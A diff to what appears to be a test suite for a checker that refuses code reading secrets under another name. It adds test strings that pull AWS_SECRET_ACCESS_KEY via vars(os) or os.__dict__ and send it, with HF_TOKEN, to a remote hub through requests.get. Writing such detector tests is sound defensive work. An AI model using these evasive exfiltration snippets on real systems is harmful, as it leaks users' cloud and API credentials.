@@ -3450,6 +3450,16 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'read_secret = os.getenv\n'
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
         + ' "b": read_secret("AWS_SECRET_ACCESS_KEY")})\n',
+        # A module dictionary leaves the name as a string and nothing else,
+        # exactly as it did for the write methods.
+        'import os\nimport requests\n' + hub
+        + 'other = vars(os)["environ"]["AWS_SECRET_ACCESS_KEY"]\n'
+        + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": other})\n',
+        'import os\nimport requests\n' + hub
+        + 'other = os.__dict__["environ"]["AWS_SECRET_ACCESS_KEY"]\n'
+        + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": other})\n',
         # The module can be renamed too, and then the receiver says nothing
         # about what the .getenv on it reads.
         'import os\nimport os as o\nimport requests\n' + hub
